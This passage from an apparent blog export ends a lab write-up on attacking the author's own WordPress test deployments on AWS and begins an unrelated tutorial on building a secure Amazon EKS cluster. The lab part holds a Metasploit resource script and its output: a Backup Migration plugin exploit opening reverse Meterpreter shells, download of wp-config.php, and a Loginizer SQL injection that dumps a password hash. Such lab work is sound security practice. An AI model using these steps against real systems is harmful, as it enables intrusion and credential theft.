ps --meterpreter-command sysinfo \\ --meterpreter-command \"download /bitnami/wordpress/wp-config.php\" use auxiliary/scanner/http/wp_loginizer_log_sqli set rhost ${PUBLIC_IP} set verbose true run exit -y EOF EOF2 done The output below was shortened, showing only the attack against WordPress on Amazon ECS: *** http://wordpr-Publi-BpPriJDxXb94-436714884.eu-central-1.elb.amazonaws.com ** Welcome to Metasploit Framework Initial Setup ** Please answer a few questions to get started. ** Metasploit Framework Initial Setup Complete ** Running the 'init' command for the database: Existing database found, attempting to start it Starting database at /home/kali/snap/metasploit-framework/common/.msf4/db...server starting success This copy of metasploit-framework is more than two weeks old. Consider running 'msfupdate' to update to the latest version. [*] Processing stdin for ERB directives. resource (stdin)&gt; use exploit/multi/http/wp_backup_migration_php_filter [*] Using configured payload php/meterpreter/reverse_tcp resource (stdin)&gt; set rhost http://wordpr-Publi-BpPriJDxXb94-436714884.eu-central-1.elb.amazonaws.com rhost =&gt; http://wordpr-Publi-BpPriJDxXb94-436714884.eu-central-1.elb.amazonaws.com resource (stdin)&gt; set lhost 18.185.154.248 lhost =&gt; 18.185.154.248 resource (stdin)&gt; set lport 443 lport =&gt; 443 resource (stdin)&gt; run --no-interact [*] Exploiting target 18.158.31.183 [-] Handler failed to bind to 18.185.154.248:443:- - [*] Started reverse TCP handler on 0.0.0.0:443 [*] Running automatic check (\"set AutoCheck false\" to disable) [*] WordPress Version: 6.5.3 [+] Detected Backup Migration Plugin version: 1.3.7 [+] The target appears to be vulnerable. [*] Writing the payload to disk, character by character, please wait... [*] Sending stage (39927 bytes) to 3.71.92.221 [+] Deleted Y [+] Deleted pLqV.php [*] Meterpreter session 1 opened (10.192.10.69:443 -&gt; 3.71.92.221:40930) at 2024-06-01 18:18:03 +0000 [*] Session 1 created in the background. [*] Exploiting target 18.194.82.16 [-] Handler failed to bind to 18.185.154.248:443:- - [*] Started reverse TCP handler on 0.0.0.0:443 [*] Running automatic check (\"set AutoCheck false\" to disable) [*] WordPress Version: 6.5.3 [+] Detected Backup Migration Plugin version: 1.3.7 [+] The target appears to be vulnerable. [*] Writing the payload to disk, character by character, please wait... [*] Sending stage (39927 bytes) to 3.71.92.221 [+] Deleted d [+] Deleted pLqV.php [*] Meterpreter session 2 opened (10.192.10.69:443 -&gt; 3.71.92.221:35022) at 2024-06-01 18:19:07 +0000 [*] Session 2 created in the background. resource (stdin)&gt; sessions --interact 1 --meterpreter-command ps --meterpreter-command sysinfo --meterpreter-command \"download /bitnami/wordpress/wp-config.php\" [*] Running 'ps' on meterpreter session 1 (18.158.31.183) Process List ============ PID Name User Path --- ---- ---- ---- 1 /bin/sh 1001 /bin/sh -c /opt/copilot/scripts/startup.sh 8 /bin/sh 1001 /bin/sh /opt/copilot/scripts/startup.sh 15 /managed-agents/execute-command/amazon-ssm-agent root /managed-agents/execute-command/amazon-ssm-agent 30 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 60 /managed-agents/execute-command/ssm-agent-worker root /managed-agents/execute-command/ssm-agent-worker 345 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 346 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 347 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 348 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 349 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 350 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 352 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 406 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 407 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 408 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 419 sh 1001 sh -c ps ax -w -o pid,user,cmd --no-header 2&gt;/dev/null 420 ps 1001 ps ax -w -o pid,user,cmd --no-header [*] Running 'sysinfo' on meterpreter session 1 (18.158.31.183) Computer : ip-10-0-0-38.eu-central-1.compute.internal OS : Linux ip-10-0-0-38.eu-central-1.compute.internal 5.10.215-203.850.amzn2.x86_64 #1 SMP Tue Apr 23 20:32:19 UTC 2024 x86_64 Meterpreter : php/linux [*] Running 'download /bitnami/wordpress/wp-config.php' on meterpreter session 1 (18.158.31.183) [*] Downloading: /bitnami/wordpress/wp-config.php -&gt; /home/kali/wp-config.php [*] Downloaded 4.28 KiB of 4.28 KiB (100.0%): /bitnami/wordpress/wp-config.php -&gt; /home/kali/wp-config.php [*] Completed : /bitnami/wordpress/wp-config.php -&gt; /home/kali/wp-config.php resource (stdin)&gt; use auxiliary/scanner/http/wp_loginizer_log_sqli resource (stdin)&gt; set rhost http://wordpr-Publi-BpPriJDxXb94-436714884.eu-central-1.elb.amazonaws.com rhost =&gt; http://wordpr-Publi-BpPriJDxXb94-436714884.eu-central-1.elb.amazonaws.com resource (stdin)&gt; set verbose true verbose =&gt; true resource (stdin)&gt; run [*] Checking /wp-content/plugins/loginizer/readme.txt [*] Found version 1.6.3 in the plugin [+] Vulnerable version of Loginizer detected [*] {SQLi} Executing (select group_concat(JC) from (select cast(concat_ws(';',ifnull(user_login,''),ifnull(user_pass,'')) as binary) JC from wp_users limit 1) JIVez) [*] {SQLi} Time-based injection: expecting output of length 44 [+] wp_users ======== user_login user_pass ---------- --------- wordpress $P$B8OjOUCRrPXm/TrVQ2/WJqUp5w7WmI. [*] Scanned 1 of 2 hosts (50% complete) [*] Checking /wp-content/plugins/loginizer/readme.txt [*] Found version 1.6.3 in the plugin [+] Vulnerable version of Loginizer detected [*] Scanned 1 of 2 hosts (50% complete) [*] {SQLi} Executing (select group_concat(TXChHXg) from (select cast(concat_ws(';',ifnull(user_login,''),ifnull(user_pass,'')) as binary) TXChHXg from wp_users limit 1) fA) [*] Scanned 1 of 2 hosts (50% complete) [*] Scanned 1 of 2 hosts (50% complete) [*] Scanned 1 of 2 hosts (50% complete) [*] {SQLi} Time-based injection: expecting output of length 44 [+] wp_users ======== user_login user_pass ---------- --------- wordpress $P$B8OjOUCRrPXm/TrVQ2/WJqUp5w7WmI. [*] Scanned 2 of 2 hosts (100% complete) [*] Auxiliary module execution completed resource (stdin)&gt; exit -y From the outputs above, you can see the attack against WordPress was successful. We obtained details about the remote system, such as a list of processes, the wp-config.php file, system details, and a list of users with their password hashes. Cleanup Delete the Amazon EKS cluster, EC2 instances, VPCs, EC2 Key Pair, DB snapshots, SSM parameters, and CloudWatch Log Groups: export AWS_DEFAULT_REGION=\"eu-central-1\" export AWS_EC2_KEY_PAIR_NAME=\"wordpress-test\" export SOLUTION_KALI=\"KaliLinux-NICE-DCV\" export SOLUTION_EC2_CONTAINER=\"Amazon-EC2-Container\" export SOLUTION_EC2=\"Amazon-EC2\" aws cloudformation delete-stack --stack-name \"${SOLUTION_KALI}\" aws cloudformation delete-stack --stack-name \"${SOLUTION_EC2_CONTAINER}\" aws cloudformation delete-stack --stack-name \"${SOLUTION_EC2}\" aws cloudformation delete-stack --stack-name \"${SOLUTION_KALI}-VPC\" aws cloudformation delete-stack --stack-name \"${SOLUTION_EC2_CONTAINER}-VPC\" aws cloudformation delete-stack --stack-name \"${SOLUTION_EC2}-VPC\" aws ec2 delete-key-pair --key-name \"${AWS_EC2_KEY_PAIR_NAME}\" for FILE in ${TMP_DIR}/{vpc_cloudformation_template.yml,KaliLinux-NICE-DCV.yaml,UbuntuLinux-2204-LAMP-server.yaml,AmazonLinux-2023-LAMP-server.yaml,${AWS_EC2_KEY_PAIR_NAME}.pem,wordpress_plugin_install.sh,Dockerfile,startup.sh}; do if [[ -f \"${FILE}\" ]]; then rm -v \"${FILE}\" else echo \"*** File not found: ${FILE}\" fi done if copilot app ls | grep wordpress; then copilot app delete --name wordpress --yes if [[ -d \"${TMP_DIR}/copilot\" ]]; then rm -rf \"${TMP_DIR}/copilot\" fi fi if aws ssm get-parameter --name /copilot/wordpress/dev/secrets/WORDPRESS_USERNAME; then aws ssm delete-parameter --name /copilot/wordpress/dev/secrets/WORDPRESS_USERNAME fi if aws ssm get-parameter --name /copilot/wordpress/dev/secrets/WORDPRESS_PASSWORD; then aws ssm delete-parameter --name /copilot/wordpress/dev/secrets/WORDPRESS_PASSWORD fi aws logs describe-log-groups --log-group-name-prefix /aws/lambda/wordpress-dev-wordpress --query 'logGroups[*].logGroupName' | jq -r '.[]' | xargs -I {} aws logs delete-log-group --log-group-name {} aws rds describe-db-cluster-snapshots --query \"DBClusterSnapshots[?starts_with(DBClusterSnapshotIdentifier, \\`wordpress-dev-wordpress\\`) == \\`true\\`].DBClusterSnapshotIdentifier\" | jq -r '.[]' | xargs -I {} aws rds delete-db-cluster-snapshot --db-cluster-snapshot-identifier {} Enjoy … 😉" }, { "title": "Build secure and cheap Amazon EKS with Pod Identities", "url": "/posts/secure-cheap-amazon-eks-with-pod-identities/", "categories": "Kubernetes, Cloud, Security", "tags": "amazon-eks, kubernetes, security, eksctl, cert-manager, external-dns, prometheus", "date": "2024-05-03 00:00:00 +0200", "content": "I will outline the steps for setting up an Amazon EKS environment that is both cost-effective and prioritizes security, including the configuration of standard applications. The Amazon EKS setup should align with the following cost-effectiveness criteria: Utilize two Availability Zones (AZs), or a single zone if possible, to reduce payments for cross-AZ traffic Spot instances Less expensive region - us-east-1 Most price efficient EC2 instance type t4g.medium (2 x CPU, 4GB RAM) using AWS Graviton based on ARM Use Bottlerocket OS for a minimal operating system, CPU, and memory footprint Use Network Load Balancer (NLB) as a most cost efficient + cost optimized load balancer Karpenter to enable automatic node scaling that matches the specific resource requirements of pods The Amazon EKS setup should also meet the following security requirements: The Amazon EKS control plane must be encrypted using KMS Worker node EBS volumes must be encrypted Cluster logging to CloudWatch must be configured Network Policies should be enabled where supported EKS Pod Identities should be used to allow applications and pods to communicate with AWS APIs Build Amazon EKS cluster Requirements You will need to configure the AWS CLI and set up other necessary secrets and variables. # AWS Credentials export AWS_ACCESS_KEY_ID=\"xxxxxxxxxxxxxxxxxx\" export AWS_SECRET_ACCESS_KEY=\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\" export AWS_SESSION_TOKEN=\"xxxxxxxx\" export AWS_ROLE_TO_ASSUME=\"arn:aws:iam::7xxxxxxxxxx7:role/Gixxxxxxxxxxxxxxxxxxxxle\" export GOOGLE_CLIENT_ID=\"10xxxxxxxxxxxxxxxud.apps.googleusercontent.com\" export GOOGLE_CLIENT_SECRET=\"GOxxxxxxxxxxxxxxxtw\" If you plan to follow this document and its tasks, you will need to set up a few environment variables, such as: # AWS Region export AWS_DEFAULT_REGION=\"${AWS_DEFAULT_REGION:-us-east-1}\" # Hostname / FQDN definitions export CLUSTER_FQDN=\"${CLUSTER_FQDN:-k01.k8s.mylabs.dev}\" # Base Domain: k8s.mylabs.dev export BASE_DOMAIN=\"${CLUSTER_FQDN#*.}\" # Cluster Name: k01 export CLUSTER_NAME=\"${CLUSTER_FQDN%%.*}\" export MY_EMAIL=\"petr.ruzicka@gmail.com\" export TMP_DIR=\"${TMP_DIR:-${PWD}/tmp}\" export KUBECONFIG=\"${KUBECONFIG:-${TMP_DIR}/${CLUSTER_FQDN}/kubeconfig-${CLUSTER_NAME}.conf}\" # Tags used to tag the AWS resources export TAGS=\"${TAGS:-Owner=${MY_EMAIL},Environment=dev,Cluster=${CLUSTER_FQDN}}\" export AWS_PARTITION=\"aws\" AWS_ACCOUNT_ID=$(aws sts get-caller-identity --query \"Account\" --output text) &amp;&amp; export AWS_ACCOUNT_ID mkdir -pv \"${TMP_DIR}/${CLUSTER_FQDN}\" Confirm that all essential variables have been properly configured: : \"${AWS_ACCESS_KEY_ID?}\" : \"${AWS_DEFAULT_REGION?}\" : \"${AWS_SECRET_ACCESS_KEY?}\" : \"${AWS_ROLE_TO_ASSUME?}\" : \"${GOOGLE_CLIENT_ID?}\" : \"${GOOGLE_CLIENT_SECRET?}\" echo -e \"${MY_EMAIL} | ${CLUSTER_NAME} | ${BASE_DOMAIN} | ${CLUSTER_FQDN}\\n${TAGS}\" Install the required tools: You can bypass these procedures if you already have all the essential software installed. AWS CLI eksctl kubectl helm Configure AWS Route 53 Domain delegation The DNS delegation tasks should be executed as a one-time operation. Create a DNS zone for the EKS clusters: export CLOUDFLARE_EMAIL=\"petr.ruzicka@gmail.com\" export CLOUDFLARE_API_KEY=\"1xxxxxxxxx0\" aws route53 create-hosted-zone --output json \\ --name \"${BASE_DOMAIN}\" \\ --caller-reference \"$(date)\" \\ --hosted-zone-config=\"{\\\"Comment\\\": \\\"Created by petr.ruzicka@gmail.com\\\", \\\"PrivateZone\\\": false}\" | jq Route53 k8s.mylabs.dev zone Utilize your domain registrar to update the nameservers for your zone (e.g., mylabs.dev) to point to Amazon Route 53 nameservers. Here’s how to discover the required Route 53 nameservers: NEW_ZONE_ID=$(aws route53 list-hosted-zones --query \"HostedZones[?Name==\\`${BASE_DOMAIN}.\\`].Id\" --output text) NEW_ZONE_NS=$(aws route53 get-hosted-zone --output json --id \"${NEW_ZONE_ID}\" --query \"DelegationSet.NameServers\") NEW_ZONE_NS1=$(echo \"${NEW_ZONE_NS}\" | jq -r \".[0]\") NEW_ZONE_NS2=$(echo \"${NEW_ZONE_NS}\" | jq -r \".[1]\") Establish the NS record in k8s.mylabs.dev (your BASE_DOMAIN) for proper zone delegation. This operation’s specifics may vary based on your domain registrar; I use Cloudflare and employ Ansible for automation: ansible -m cloudflare_dns -c local -i \"localhost,\" localhost -a \"zone=mylabs.dev record=${BASE_DOMAIN} type=NS value=${NEW_ZONE_NS1} solo=true proxied=no account_email=${CLOUDFLARE_EMAIL} account_api_token=${CLOUDFLARE_API_KEY}\" ansible -m cloudflare_dns -c local -i \"localhost,\" localhost -a \"zone=mylabs.dev record=${BASE_DOMAIN} type=NS value=${NEW_ZONE_NS2} solo=false proxied=no account_email=${CLOUDFLARE_EMAIL} account_api_token=${CLOUDFLARE_API_KEY}\" localhost | CHANGED =&gt; { \"ansible_facts\": { \"discovered_interpreter_python\": \"/usr/bin/python\" }, \"changed\": true, \"result\": { \"record\": { \"content\": \"ns-885.awsdns-46.net\", \"created_on\": \"2020-11-13T06:25:32.18642Z\", \"id\": \"dxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxb\", \"locked\": false, \"meta\": { \"auto_added\": false, \"managed_by_apps\": false, \"managed_by_argo_tunnel\": false, \"source\": \"primary\" }, \"modified_on\": \"2020-11-13T06:25:32.18642Z\", \"name\": \"k8s.mylabs.dev\", \"proxiable\": false, \"proxied\": false, \"ttl\": 1, \"type\": \"NS\", \"zone_id\": \"2xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxe\", \"zone_name\": \"mylabs.dev\" } } } localhost | CHANGED =&gt; { \"ansible_facts\": { \"discovered_interpreter_python\": \"/usr/bin/python\" }, \"changed\": true, \"result\": { \"record\": { \"content\": \"ns-1692.awsdns-19.co.uk\", \"created_on\": \"2020-11-13T06:25:37.605605Z\", \"id\": \"9xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxb\", \"locked\": false, \"meta\": { \"auto_added\": false, \"managed_by_apps\": false, \"managed_by_argo_tunnel\": false, \"source\": \"primary\" }, \"modified_on\": \"2020-11-13T06:25:37.605605Z\", \"name\": \"k8s.mylabs.dev\", \"proxiable\": false, \"proxied\": false, \"ttl\": 1, \"type\": \"NS\", \"zone_id\": \"2xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxe\", \"zone_name\": \"mylabs.dev\" } } } CloudFlare mylabs.dev zone Create the service-linked role Creating the service-linked role for Spot Instances is a one-time operation. Create the AWSServiceRoleForEC2Spot role to use Spot Instances in the Amazon EKS cluster: aws iam create-service-linked-role --aws-service-name spot.amazonaws.com Details: Work with Spot Instances Create Route53 zone, KMS key and Karpenter infrastructure Generate a CloudFormation template that defines an Amazon Route 53 zone and an AWS Key Management Service (KMS) key. The CloudFormation template below also includes the Karpenter CloudFormation resources. Add the new domain CLUSTER_FQDN to Route 53, and set up DNS delegation from the BASE_DOMAIN. tee \"${TMP_DIR}/${CLUSTER_FQDN}/aws-cf-route53-kms-karpenter.yml\" &lt;&lt; \\EOF AWSTemplateFormatVersion: 2010-09-09 Description: Route53 entries and KMS key Parameters: BaseDomain: Description: \"Base domain where cluster domains + their subdomains will live - Ex: k8s.mylabs.dev\" Type: String ClusterFQDN: Description: \"Cluster FQDN (domain for all applications) - Ex: k01.k8s.mylabs.dev\" Type: String ClusterName: Description: \"Cluster Name - Ex: k01\" Type: String Resources: HostedZone: Type: AWS::Route53::HostedZone Properties: Name: !Ref ClusterFQDN RecordSet: Type: AWS::Route53::RecordSet Properties: HostedZoneName: !Sub \"${BaseDomain}.\" Name: !Ref ClusterFQDN Type: NS TTL: 60 ResourceRecords: !GetAtt HostedZone.NameServers # https://karpenter.sh/docs/reference/cloudformation/ KarpenterNodeInstanceProfile: Type: \"AWS::IAM::InstanceProfile\" Properties: InstanceProfileName: !Sub \"eksctl-${ClusterName}-karpenter-node-instance-profile\" Path: \"/\" Roles: - Ref: \"KarpenterNodeRole\" KarpenterNodeRole: Type: AWS::IAM::Role Properties: RoleName: !Sub \"eksctl-${ClusterName}-karpenter-node-role\" Path: / AssumeRolePolicyDocument: Version: \"2012-10-17\" Statement: - Effect: Allow Principal: Service: !Sub \"ec2.${AWS::URLSuffix}\" Action: - \"sts:AssumeRole\" ManagedPolicyArns: - !Sub \"arn:${AWS::Partition}:iam::aws:policy/AmazonEKS_CNI_Policy\" - !Sub \"arn:${AWS::Partition}:iam::aws:policy/AmazonEKSWorkerNodePolicy\" - !Sub \"arn:${AWS::Partition}:iam::aws:policy/AmazonEC2ContainerRegistryReadOnly\" - !Sub \"arn:${AWS::Partition}:iam::aws:policy/AmazonSSMManagedInstanceCore\" KarpenterControllerPolicy: Type: AWS::IAM::ManagedPolicy Properties: ManagedPolicyName: !Sub \"eksctl-${ClusterName}-karpenter-controller-policy\" PolicyDocument: !Sub | { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Sid\": \"AllowScopedEC2InstanceAccessActions\", \"Effect\": \"Allow\", \"Resource\": [ \"arn:${AWS::Partition}:ec2:${AWS::Region}::image/*\", \"arn:${AWS::Partition}:ec2:${AWS::Region}::snapshot/*\", \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:security-group/*\", \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:subnet/*\" ], \"Action\": [ \"ec2:RunInstances\", \"ec2:CreateFleet\" ] }, { \"Sid\": \"AllowScopedEC2LaunchTemplateAccessActions\", \"Effect\": \"Allow\", \"Resource\": \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:launch-template/*\", \"Action\": [ \"ec2:RunInstances\", \"ec2:CreateFleet\" ], \"Condition\": { \"StringEquals\": { \"aws:ResourceTag/kubernetes.io/cluster/${ClusterName}\": \"owned\" }, \"StringLike\": { \"aws:ResourceTag/karpenter.sh/nodepool\": \"*\" } } }, { \"Sid\": \"AllowScopedEC2InstanceActionsWithTags\", \"Effect\": \"Allow\", \"Resource\": [ \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:fleet/*\", \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:instance/*\", \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:volume/*\", \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:network-interface/*\", \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:launch-template/*\", \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:spot-instances-request/*\" ], \"Action\": [ \"ec2:RunInstances\", \"ec2:CreateFleet\", \"ec2:CreateLaunchTemplate\" ], \"Condition\": { \"StringEquals\": { \"aws:RequestTag/kubernetes.io/cluster/${ClusterName}\": \"owned\" }, \"StringLike\": { \"aws:RequestTag/karpenter.sh/nodepool\": \"*\" } } }, { \"Sid\": \"AllowScopedResourceCreationTagging\", \"Effect\": \"Allow\", \"Resource\": [ \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:fleet/*\", \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:instance/*\", \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:volume/*\", \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:network-interface/*\", \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:launch-template/*\", \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:spot-instances-request/*\" ], \"Action\": \"ec2:CreateTags\", \"Condition\": { \"StringEquals\": { \"aws:RequestTag/kubernetes.io/cluster/${ClusterName}\": \"owned\", \"ec2:CreateAction\": [ \"RunInstances\", \"CreateFleet\", \"CreateLaunchTemplate\" ] }, \"StringLike\": { \"aws:RequestTag/karpenter.sh/nodepool\": \"*\" } } }, { \"Sid\": \"AllowScopedResourceTagging\", \"Effect\": \"Allow\", \"Resource\": \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:instance/*\", \"Action\": \"ec2:CreateTags\", \"Condition\": { \"StringEquals\": { \"aws:ResourceTag/kubernetes.io/cluster/${ClusterName}\": \"owned\" }, \"StringLike\": { \"aws:ResourceTag/karpenter.sh/nodepool\": \"*\" }, \"ForAllValues:StringEquals\": { \"aws:TagKeys\": [ \"karpenter.sh/nodeclaim\", \"Name\" ] } } }, { \"Sid\": \"AllowScopedDeletion\", \"Effect\": \"Allow\", \"Resource\": [ \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:instance/*\", \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:launch-template/*\" ], \"Action\": [ \"ec2:TerminateInstances\", \"ec2:DeleteLaunchTemplate\" ], \"Condition\": { \"StringEquals\": { \"aws:ResourceTag/kubernetes.io/cluster/${ClusterName}\": \"owned\" }, \"StringLike\": { \"aws:ResourceTag/karpenter.sh/nodepool\": \"*\" } } }, { \"Sid\": \"AllowRegionalReadActions\", \"Effect\": \"Allow\", \"Resource\": \"*\", \"Action\": [ \"ec2:DescribeAvailabilityZones\", \"ec2:DescribeImages\", \"ec2:DescribeInstances\", \"ec2:DescribeInstanceTypeOfferings\", \"ec2:DescribeInstanceTypes\", \"ec2:DescribeLaunchTemplates\", \"ec2:DescribeSecurityGroups\", \"ec2:DescribeSpotPriceHistory\", \"ec2:DescribeSubnets\" ], \"Condition\": { \"StringEquals\": { \"aws:RequestedRegion\": \"${AWS::Region}\" } } }, { \"Sid\": \"AllowSSMReadActions\", \"Effect\": \"Allow\", \"Resource\": \"arn:${AWS::Partition}:ssm:${AWS::Region}::parameter/aws/service/*\", \"Action\": \"ssm:GetParameter\" }, { \"Sid\": \"AllowPricingReadActions\", \"Effect\": \"Allow\", \"Resource\": \"*\", \"Action\": \"pricing:GetProducts\" }, { \"Sid\": \"AllowInterruptionQueueActions\", \"Effect\": \"Allow\", \"Resource\": \"${KarpenterInterruptionQueue.Arn}\", \"Action\": [ \"sqs:DeleteMessage\", \"sqs:GetQueueUrl\", \"sqs:ReceiveMessage\" ] }, { \"Sid\": \"AllowPassingInstanceRole\", \"Effect\": \"Allow\", \"Resource\": \"${KarpenterNodeRole.Arn}\", \"Action\": \"iam:PassRole\", \"Condition\": { \"StringEquals\": { \"iam:PassedToService\": \"ec2.amazonaws.com\" } } }, { \"Sid\": \"AllowScopedInstanceProfileCreationActions\", \"Effect\": \"Allow\", \"Resource\": \"*\", \"Action\": [ \"iam:CreateInstanceProfile\" ], \"Condition\": { \"StringEquals\": { \"aws:RequestTag/kubernetes.io/cluster/${ClusterName}\": \"owned\", \"aws:RequestTag/topology.kubernetes.io/region\": \"${AWS::Region}\" }, \"StringLike\": { \"aws:RequestTag/karpenter.k8s.aws/ec2nodeclass\": \"*\" } } }, { \"Sid\": \"AllowScopedInstanceProfileTagActions\", \"Effect\": \"Allow\", \"Resource\": \"*\", \"Action\": [ \"iam:TagInstanceProfile\" ], \"Condition\": { \"StringEquals\": { \"aws:ResourceTag/kubernetes.io/cluster/${ClusterName}\": \"owned\", \"aws:ResourceTag/topology.kubernetes.io/region\": \"${AWS::Region}\", \"aws:RequestTag/kubernetes.io/cluster/${ClusterName}\": \"owned\", \"aws:RequestTag/topology.kubernetes.io/region\": \"${AWS::Region}\" }, \"StringLike\": { \"aws:ResourceTag/karpenter.k8s.aws/ec2nodeclass\": \"*\", \"aws:RequestTag/karpenter.k8s.aws/ec2nodeclass\": \"*\" } } }, { \"Sid\": \"AllowScopedInstanceProfileActions\", \"Effect\": \"Allow\", \"Resource\": \"*\", \"Action\": [ \"iam:AddRoleToInstanceProfile\", \"iam:RemoveRoleFromInstanceProfile\", \"iam:DeleteInstanceProfile\" ], \"Condition\": { \"StringEquals\": { \"aws:ResourceTag/kubernetes.io/cluster/${ClusterName}\": \"owned\", \"aws:ResourceTag/topology.kubernetes.io/region\": \"${AWS::Region}\" }, \"StringLike\": { \"aws:ResourceTag/karpenter.k8s.aws/ec2nodeclass\": \"*\" } } }, { \"Sid\": \"AllowInstanceProfileReadActions\", \"Effect\": \"Allow\", \"Resource\": \"*\", \"Action\": \"iam:GetInstanceProfile\" }, { \"Sid\": \"AllowAPIServerEndpointDiscovery\", \"Effect\": \"Allow\", \"Resource\": \"arn:${AWS::Partition}:eks:${AWS::Region}:${AWS::AccountId}:cluster/${ClusterName}\", \"Action\": \"eks:DescribeCluster\" } ] } KarpenterInterruptionQueue: Type: AWS::SQS::Queue Properties: QueueName: !Sub \"${ClusterName}\" MessageRetentionPeriod: 300 SqsManagedSseEnabled: true KarpenterInterruptionQueuePolicy: Type: AWS::SQS::QueuePolicy Properties: Queues: - !Ref KarpenterInterruptionQueue PolicyDocument: Id: EC2InterruptionPolicy Statement: - Effect: Allow Principal: Service: - events.amazonaws.com - sqs.amazonaws.com Action: sqs:SendMessage Resource: !GetAtt KarpenterInterruptionQueue.Arn ScheduledChangeRule: Type: AWS::Events::Rule Properties: EventPattern: source: - aws.health detail-type: - AWS Health Event Targets: - Id: KarpenterInterruptionQueueTarget Arn: !GetAtt KarpenterInterruptionQueue.Arn SpotInterruptionRule: Type: AWS::Events::Rule Properties: EventPattern: source: - aws.ec2 detail-type: - EC2 Spot Instance Interruption Warning Targets: - Id: KarpenterInterruptionQueueTarget Arn: !GetAtt KarpenterInterruptionQueue.Arn RebalanceRule: Type: AWS::Events::Rule Properties: EventPattern: source: - aws.ec2 detail-type: - EC2 Instance Rebalance Recommendation Targets: - Id: KarpenterInterruptionQueueTarget Arn: !GetAtt KarpenterInterruptionQueue.Arn InstanceStateChangeRule: Type: AWS::Events::Rule Properties: EventPattern: source: - aws.ec2 detail-type: - EC2 Instance State-change Notification Targets: - Id: KarpenterInterruptionQueueTarget Arn: !GetAtt KarpenterInterruptionQueue.Arn KMSAlias: Type: AWS::KMS::Alias Properties: AliasName: !Sub \"alias/eks-${ClusterName}\" TargetKeyId: !Ref KMSKey KMSKey: Type: AWS::KMS::Key Properties: Description: !Sub \"KMS key for ${ClusterName} Amazon EKS\" EnableKeyRotation: true PendingWindowInDays: 7 KeyPolicy: Version: \"2012-10-17\" Id: !Sub \"eks-key-policy-${ClusterName}\" Statement: - Sid: Allow direct access to key metadata to the account Effect: Allow Principal: AWS: - !Sub \"arn:${AWS::Partition}:iam::${AWS::AccountId}:root\" Action: - kms:* Resource: \"*\" - Sid: Allow access through EBS for all principals in the account that are authorized to use EBS Effect: Allow Principal: AWS: \"*\" Action: - kms:Encrypt - kms:Decrypt - kms:ReEncrypt* - kms:GenerateDataKey* - kms:CreateGrant - kms:DescribeKey Resource: \"*\" Condition: StringEquals: kms:ViaService: !Sub \"ec2.${AWS::Region}.amazonaws.com\" kms:CallerAccount: !Sub \"${AWS::AccountId}\" Outputs: KMSKeyArn: Description: The ARN of the created KMS Key to encrypt EKS related services Value: !GetAtt KMSKey.Arn Export: Name: Fn::Sub: \"${AWS::StackName}-KMSKeyArn\" KMSKeyId: Description: The ID of the created KMS Key to encrypt EKS related services Value: !Ref KMSKey Export: Name: Fn::Sub: \"${AWS::StackName}-KMSKeyId\" KarpenterNodeRoleArn: Description: The ARN of the role used by Karpenter to launch EC2 instances Value: !GetAtt KarpenterNodeRole.Arn Export: Name: Fn::Sub: \"${AWS::StackName}-KarpenterNodeRoleArn\" KarpenterNodeInstanceProfileName: Description: The Name of the Instance Profile used by Karpenter Value: !Ref KarpenterNodeInstanceProfile Export: Name: Fn::Sub: \"${AWS::StackName}-KarpenterNodeInstanceProfileName\" KarpenterControllerPolicyArn: Description: The ARN of the policy used by Karpenter to launch EC2 instances Value: !Ref KarpenterControllerPolicy Export: Name: Fn::Sub: \"${AWS::StackName}-KarpenterControllerPolicyArn\" EOF if [[ $(aws cloudformation list-stacks --stack-status-filter CREATE_COMPLETE --query \"StackSummaries[?starts_with(StackName, \\`${CLUSTER_NAME}-route53-kms-karpenter\\`) == \\`true\\`].StackName\" --output text) == \"\" ]]; then # shellcheck disable=SC2001 eval aws cloudformation deploy --capabilities CAPABILITY_NAMED_IAM \\ --parameter-overrides \"BaseDomain=${BASE_DOMAIN} 